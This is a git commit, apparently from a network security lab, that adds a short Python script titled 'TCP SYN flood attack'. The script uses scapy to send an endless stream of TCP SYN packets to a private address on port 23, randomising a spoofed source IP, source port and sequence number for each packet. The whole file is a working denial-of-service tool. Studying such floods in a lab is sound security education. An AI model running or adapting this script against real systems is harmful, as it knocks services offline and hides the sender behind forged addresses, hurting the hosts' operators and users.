ed11970265f768a39baad5e767d4408001786ece
alaknanda-faldu <48375871+alaknanda-faldu@users.noreply.github.com>
2022-12-11 19:38:58 -0500

    TCP SYN flood attack

---
+++ TCP SYN flood attack/volumes/synflood.py
@@ -0,0 +1,15 @@
+
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+
+ip = IP(dst="10.9.0.5")
+tcp = TCP(dport=23, flags='S')
+pkt = ip/tcp
+
+while True:
+  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
+  pkt[TCP].sport = getrandbits(16) # source port
+  pkt[TCP].seq = getrandbits(32) # sequence number
+  send(pkt, iface = 'br-4c3d37380a9c', verbose = 0)
+
